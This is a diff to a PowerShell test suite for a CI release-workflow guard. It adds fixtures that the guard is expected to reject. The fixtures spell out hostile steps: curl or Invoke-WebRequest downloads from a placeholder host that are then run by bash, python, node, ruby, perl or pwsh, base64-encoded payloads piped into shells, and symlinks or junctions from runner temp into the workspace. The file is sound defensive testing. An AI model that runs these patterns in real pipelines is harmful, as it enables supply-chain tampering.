@@ -238,7 +238,8 @@ function New-WorkflowRunnerTempRedirectFixture {
         [Parameter(Mandatory)] [string] $LinkText,
         [Parameter(Mandatory)] [string] $WriteText,
         [Parameter(Mandatory)] [string] $Shell,
-        [Parameter(Mandatory)] [ValidateSet('before artifact download', 'after artifact download', 'between guarded invocations')] [string] $Position
+        [Parameter(Mandatory)] [ValidateSet('before artifact download', 'after artifact download', 'between guarded invocations')] [string] $Position,
+        [switch] $IncludeShellCheckout
     )
 
     $lines = [Collections.Generic.List[string]]::new()
@@ -249,6 +250,12 @@ function New-WorkflowRunnerTempRedirectFixture {
 
     $linkStep = @{ Name = 'Create a runner-temp path redirect'; Text = $LinkText; Shell = $Shell }
     $writeStep = @{ Name = 'Write through the runner-temp path'; Text = $WriteText; Shell = $Shell }
+    $shellCheckoutStep = if ($Shell -match '^(?i:bash|sh)$') {
+        @{ Name = 'Keep the pinned shell source'; Text = 'git checkout --detach ''${{ github.sha }}'''; Shell = $Shell }
+    }
+    else {
+        @{ Name = 'Keep the pinned shell source'; Text = 'git -C "$env:GITHUB_WORKSPACE" switch --detach $env:GITHUB_SHA'; Shell = $Shell }
+    }
     $validCheckout = @{
         Lines = $lines
         SequenceIndent = 6
@@ -263,6 +270,7 @@ function New-WorkflowRunnerTempRedirectFixture {
 
     if ($Position -eq 'before artifact download') {
         Add-WorkflowFixtureRunSteps -Lines $lines -RunSteps @($linkStep)
+        if ($IncludeShellCheckout) { Add-WorkflowFixtureRunSteps -Lines $lines -RunSteps @($shellCheckoutStep) }
         Add-WorkflowFixtureDownload -Lines $lines -SequenceIndent 6 -FieldIndent 8
         Add-WorkflowFixtureCheckout @validCheckout
         Add-WorkflowFixtureDownload -Lines $lines -SequenceIndent 6 -FieldIndent 8
@@ -270,6 +278,7 @@ function New-WorkflowRunnerTempRedirectFixture {
     elseif ($Position -eq 'after artifact download') {
         Add-WorkflowFixtureDownload -Lines $lines -SequenceIndent 6 -FieldIndent 8
         Add-WorkflowFixtureRunSteps -Lines $lines -RunSteps @($linkStep)
+        if ($IncludeShellCheckout) { Add-WorkflowFixtureRunSteps -Lines $lines -RunSteps @($shellCheckoutStep) }
         Add-WorkflowFixtureCheckout @validCheckout
         Add-WorkflowFixtureDownload -Lines $lines -SequenceIndent 6 -FieldIndent 8
     }
@@ -277,6 +286,7 @@ function New-WorkflowRunnerTempRedirectFixture {
         Add-WorkflowFixtureDownload -Lines $lines -SequenceIndent 6 -FieldIndent 8
         Add-WorkflowFixtureScripts -Lines $lines -SequenceIndent 6 -FieldIndent 8 -ScriptPaths @($ScriptPath)
         Add-WorkflowFixtureRunSteps -Lines $lines -RunSteps @($linkStep)
+        if ($IncludeShellCheckout) { Add-WorkflowFixtureRunSteps -Lines $lines -RunSteps @($shellCheckoutStep) }
         Add-WorkflowFixtureCheckout @validCheckout
         Add-WorkflowFixtureDownload -Lines $lines -SequenceIndent 6 -FieldIndent 8
     }
@@ -658,6 +668,129 @@ fi
             if (-not $rejected) { throw "Workflow contract accepted $($case.Name) $position after a pinned checkout." }
         }
     }
+
+    $newline = [Environment]::NewLine
+    $workflowRunnerTemp = ([char]36).ToString() + '{{ runner.temp }}'
+    $encodedRootCurl = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('curl --output CHANGELOG.md https://host/payload'))
+    $encodedNestedCurl = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('curl --output src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload'))
+    $hiddenInterpreterCases = @(
+        @{ Name = 'Bash stdin pipeline hides root curl writer'; Text = "printf '%s\n' 'curl --output CHANGELOG.md https://host/payload' | bash -s"; Shell = 'bash' },
+        @{ Name = 'Bash stdin pipeline hides nested curl writer'; Text = "printf '%s\n' 'curl --output src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload' | bash -s"; Shell = 'bash' },
+        @{ Name = 'env wrapper hides Bash stdin execution'; Text = "printf '%s\n' 'curl --output CHANGELOG.md https://host/payload' | env bash -s"; Shell = 'bash' },
+        @{ Name = 'Absolute Bash path hides nested stdin execution'; Text = "printf '%s\n' 'curl --output src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload' | /bin/bash -s"; Shell = 'bash' },
+        @{ Name = 'Quoted absolute PowerShell path loads an external script'; Text = ('& ''C:\Program Files\PowerShell\7\pwsh.exe'' -File "' + $workflowRunnerTemp + '\rewrite-source.ps1"'); Shell = 'pwsh' },
+        @{ Name = 'Command substitution hides a Bash stdin execution'; Text = 'payload=$(bash -s)'; Shell = 'bash' },
+        @{ Name = 'Dash bare interpreter reads piped root writer'; Text = "printf '%s\n' 'curl --output CHANGELOG.md https://host/payload' | dash"; Shell = 'bash' },
+        @{ Name = 'Zsh stdin option reads nested writer'; Text = "printf '%s\n' 'curl --output src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload' | zsh -s"; Shell = 'bash' },
+        @{ Name = 'Bash here-document feeds a hidden root writer to stdin'; Text = ("base64 -d <<'PAYLOAD' | bash" + $newline + $encodedRootCurl + $newline + 'PAYLOAD'); Shell = 'bash' },
+        @{ Name = 'Bash here-document feeds a hidden nested writer to stdin'; Text = ("base64 -d <<'PAYLOAD' | bash" + $newline + $encodedNestedCurl + $newline + 'PAYLOAD'); Shell = 'bash' },
+        @{ Name = 'Python stdin pipeline loads root writer code'; Text = 'printf ''%s\n'' ''open("CHANGELOG.md", "w").write("payload")'' | python -'; Shell = 'bash' },
+        @{ Name = 'Python stdin device loads nested writer code'; Text = 'python /dev/stdin'; Shell = 'bash' },
+        @{ Name = 'Node stdin here-document loads nested writer code'; Text = ("node - <<'NODE'" + $newline + 'require("fs").writeFileSync("src/KeelMatrix.PackageSurface.Cli/README.md", "payload")' + $newline + 'NODE'); Shell = 'bash' },
+        @{ Name = 'Ruby stdin here-document loads root writer code'; Text = ("ruby - <<'RUBY'" + $newline + 'File.write("CHANGELOG.md", "payload")' + $newline + 'RUBY'); Shell = 'bash' },
+        @{ Name = 'Perl stdin pipeline loads nested writer code'; Text = 'printf ''%s\n'' ''open(F, ">", "src/KeelMatrix.PackageSurface.Cli/README.md"); print F "payload";'' | perl -'; Shell = 'bash' },
+        @{ Name = 'Bash executes an external runner-temp script'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; bash "' + $workflowRunnerTemp + '/rewrite.sh"'); Shell = 'bash' },
+        @{ Name = 'Python executes an external runner-temp script'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.py" https://host/payload; python "' + $workflowRunnerTemp + '/rewrite.py"'); Shell = 'bash' },
+        @{ Name = 'Node executes an external runner-temp script'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.js" https://host/payload; node "' + $workflowRunnerTemp + '/rewrite.js"'); Shell = 'bash' },
+        @{ Name = 'Ruby executes an external runner-temp script'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.rb" https://host/payload; ruby "' + $workflowRunnerTemp + '/rewrite.rb"'); Shell = 'bash' },
+        @{ Name = 'Perl executes an external runner-temp script'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.pl" https://host/payload; perl "' + $workflowRunnerTemp + '/rewrite.pl"'); Shell = 'bash' },
+        @{ Name = 'PowerShell -File executes an external runner-temp script'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\rewrite-source.ps1"; pwsh -File "' + $workflowRunnerTemp + '\rewrite-source.ps1"'); Shell = 'pwsh' },
+        @{ Name = 'PowerShell -File reads a script from stdin'; Text = 'pwsh -File -'; Shell = 'pwsh' },
+        @{ Name = 'Unquoted PowerShell executable argument runs an external script'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\rewrite-source.ps1"; pwsh $env:RUNNER_TEMP\rewrite-source.ps1'); Shell = 'pwsh' },
+        @{ Name = 'Unquoted PowerShell command runs an external script'; Text = '$env:RUNNER_TEMP\rewrite-source.ps1'; Shell = 'pwsh' },
+        @{ Name = 'PowerShell dot-source loads an external script'; Text = '. $env:RUNNER_TEMP\rewrite-source.ps1'; Shell = 'pwsh' },
+        @{ Name = 'PowerShell call operator runs an external script path'; Text = '& $env:RUNNER_TEMP\rewrite-source.ps1'; Shell = 'pwsh' }
+    )
+    foreach ($case in $hiddenInterpreterCases) {
+        foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
+            $runStep = @{ Name = $case.Name; Text = $case.Text; Shell = $case.Shell }
+            $fixtureArguments = @{ ScriptPath = $script }
+            if ($position -eq 'before artifact download') { $fixtureArguments.RunsBeforeDownload = @($runStep) }
+            elseif ($position -eq 'after artifact download') { $fixtureArguments.RunsAfterDownload = @($runStep) }
+            else {
+                $fixtureArguments.SecondInvocation = $true
+                $fixtureArguments.RunsBetweenInvocations = @($runStep)
+            }
+            $fixture = New-WorkflowGitScriptConsumerFixture @fixtureArguments
+            $rejected = $false
+            try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'hidden-interpreter.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
+            catch { $rejected = $true }
+            if (-not $rejected) { throw "Workflow contract accepted $($case.Name) $position." }
+        }
+    }
+
+    $hiddenRunnerTempLoaders = @(
+        @{ Name = 'Bash dot-source helper can create a tracked-path link'; Text = ('curl --output "' + $workflowRunnerTemp + '/prepare.sh" https://host/payload; . "' + $workflowRunnerTemp + '/prepare.sh"'); Shell = 'bash' },
+        @{ Name = 'Bash source helper can create a tracked-path link'; Text = ('curl --output "' + $workflowRunnerTemp + '/prepare.sh" https://host/payload; source "' + $workflowRunnerTemp + '/prepare.sh"'); Shell = 'bash' },
+        @{ Name = 'PowerShell dot-source helper can create a tracked-path link'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\prepare.ps1"; . ' + $workflowRunnerTemp + '\prepare.ps1'); Shell = 'pwsh' },
+        @{ Name = 'PowerShell -File helper can create a tracked-path link'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\prepare.ps1"; pwsh -File "' + $workflowRunnerTemp + '\prepare.ps1"'); Shell = 'pwsh' },
+        @{ Name = 'Unquoted PowerShell executable helper invocation can create a tracked-path link'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\prepare.ps1"; pwsh $env:RUNNER_TEMP\prepare.ps1'); Shell = 'pwsh' },
+        @{ Name = 'Unquoted PowerShell command helper invocation can create a tracked-path link'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\prepare.ps1"; $env:RUNNER_TEMP\prepare.ps1'); Shell = 'pwsh' }
+    )
+    $hiddenLinkTargets = @(
+        @{ Name = 'tracked root'; Write = ('curl --output "' + $workflowRunnerTemp + '/escape/CHANGELOG.md" https://host/payload') },
+        @{ Name = 'nested tracked path'; Write = ('Copy-Item source "' + $workflowRunnerTemp + '\escape\README.md"') }
+    )
+    foreach ($loader in $hiddenRunnerTempLoaders) {
+        foreach ($target in $hiddenLinkTargets) {
+            foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
+                $fixture = New-WorkflowRunnerTempRedirectFixture -ScriptPath $script -LinkText $loader.Text -WriteText $target.Write -Shell $loader.Shell -Position $position
+                $rejected = $false
+                try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'hidden-runner-temp-link.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
+                catch { $rejected = $true }
+                if (-not $rejected) { throw "Workflow contract accepted $($loader.Name) targeting a $($target.Name) $position, despite a later pinned checkout." }
+            }
+        }
+    }
+
+    $hiddenPathLinkCases = @(
+        @{
+            Name = 'Bash script creates a link to the tracked root'
+            Shell = 'bash'
+            Payload = 'ln -s "$GITHUB_WORKSPACE" "$RUNNER_TEMP/escape"'
+            Write = ('curl --output "' + $workflowRunnerTemp + '/escape/CHANGELOG.md" https://host/payload')
+        },
+        @{
+            Name = 'Bash script creates a link to a nested tracked directory'
+            Shell = 'bash'
+            Payload = 'ln -s "$GITHUB_WORKSPACE/src/KeelMatrix.PackageSurface.Cli" "$RUNNER_TEMP/escape"'
+            Write = ('curl --output "' + $workflowRunnerTemp + '/escape/README.md" https://host/payload')
+        },
+        @{
+            Name = 'PowerShell script creates a junction to the tracked root'
+            Shell = 'pwsh'
+            Payload = 'New-Item -ItemType Junction -Path "$env:RUNNER_TEMP\escape" -Target "$env:GITHUB_WORKSPACE"'
+            Write = ('Copy-Item source "' + $workflowRunnerTemp + '\escape\CHANGELOG.md"')
+        },
+        @{
+            Name = 'PowerShell script creates a junction to a nested tracked directory'
+            Shell = 'pwsh'
+            Payload = 'New-Item -ItemType Junction -Path "$env:RUNNER_TEMP\escape" -Target "$env:GITHUB_WORKSPACE\src\KeelMatrix.PackageSurface.Cli"'
+            Write = ('Copy-Item source "' + $workflowRunnerTemp + '\escape\README.md"')
+        }
+    )
+    foreach ($case in $hiddenPathLinkCases) {
+        $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($case.Payload))
+        if ($case.Shell -eq 'bash') {
+            $linkLoader = ("printf '%s' '" + $encodedPayload + "' | base64 -d > '" + $workflowRunnerTemp + "/prepare.sh'; bash '" + $workflowRunnerTemp + "/prepare.sh'")
+        }
+        else {
+            $linkLoader = ('[IO.File]::WriteAllBytes("' + $workflowRunnerTemp + '\prepare.ps1", [Convert]::FromBase64String(''' + $encodedPayload + ''')); pwsh -File "' + $workflowRunnerTemp + '\prepare.ps1"')
+        }
+        foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
+            $fixture = New-WorkflowRunnerTempRedirectFixture -ScriptPath $script -LinkText $linkLoader -WriteText $case.Write -Shell $case.Shell -Position $position -IncludeShellCheckout
+            $rejected = $false
+            try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'hidden-path-link.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
+            catch { $rejected = $true }
+            if (-not $rejected) { throw "Workflow contract accepted $($case.Name) followed by a tracked write $position, despite a later pinned checkout." }
+        }
+    }
+
+    $staticWindowsScriptFixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(
+        @{ Name = 'Invoke tracked script with Windows separators'; Text = 'pwsh -NoLogo -NoProfile -File .\scripts\validate-release-artifact-set.ps1'; Shell = 'pwsh' }
+    )
+    $staticWindowsScriptResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'static-windows-script.yml'; Text = $staticWindowsScriptFixture }) -RepositoryRoot $RepositoryRoot)
+    if ($staticWindowsScriptResult.Count -ne 1 -or $staticWindowsScriptResult[0].Scripts -notcontains $script) { throw 'A tracked PowerShell script with static Windows path separators must preserve pinned source.' }
 
     $sameStepCommandChain = New-WorkflowGitScriptConsumerFixture -ScriptPath $script
     $scriptCommand = '          pwsh -NoLogo -NoProfile -File ./' + $script
